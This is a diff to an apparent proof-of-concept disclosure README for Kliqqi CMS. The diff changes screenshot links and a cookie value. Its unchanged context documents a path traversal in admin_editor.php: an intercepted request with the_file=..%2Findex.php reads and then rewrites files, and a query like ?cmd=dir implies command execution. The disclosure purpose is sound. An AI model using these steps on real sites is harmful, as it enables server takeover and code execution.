@@ -13,14 +13,14 @@ To make this PoC, i just installed the sofware(`https://github.com/Kliqqi-CMS/Kl
 
 ### POC 
 
-<img width="1280" alt="receStore" src="https://raw.githubusercontent.com/jenaye/aapanel/master/start.png">
+<img width="1280" alt="receStore" src="https://raw.githubusercontent.com/jenaye/pligg/master/start.png">
 
 Go to `/admin/admin_editor.php` intercept the request and the change path to file.
 
 
 for exemple to get `index.php` of application :
 
-<img width="1280" alt="receStore" src="https://raw.githubusercontent.com/jenaye/aapanel/master/getindex.png">
+<img width="1280" alt="receStore" src="https://raw.githubusercontent.com/jenaye/pligg/master/getindex.png">
 
 
 
@@ -37,7 +37,7 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 Referer: http://kliqqi/admin/admin_editor.php
 Accept-Encoding: gzip, deflate
 Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
-Cookie: panelState=CollapseManage%7CCollapseSettings%7CCollapseTemplate; PHPSESSID=lfpns7pkc3gtrv5o1golmt5md3; mnm_user=Admin; mnm_key=QWRtaW46MjI0R2dEVTAxZncxZzpl
+Cookie: panelState=CollapseManage%7CCollapseSettings%7CCollapseTemplate; PHPSESSID=lfkc3gtrv5o1golmt5md3; mnm_user=Admin; mnm_key=QWRtaW46MjI0R2dEVTAxZncxZzpl
 Connection: close
 
 the_file=..%2Findex.php&open=Open
@@ -46,7 +46,7 @@ the_file=..%2Findex.php&open=Open
 
 just click on "show response in browser", and edit the file like you want
 
-<img width="1280" alt="receStore" src="https://raw.githubusercontent.com/jenaye/aapanel/master/write.png">
+<img width="1280" alt="receStore" src="https://raw.githubusercontent.com/jenaye/pligg/master/write.png">
 
 for exemple : 
 
@@ -58,4 +58,4 @@ for exemple :
 
 finaly go to `website.fr?cmd=dir`.
 
-<img width="1280" alt="receStore" src="https://raw.githubusercontent.com/jenaye/aapanel/master/rce.png">
+<img width="1280" alt="receStore" src="https://raw.githubusercontent.com/jenaye/pligg/master/rce.png">
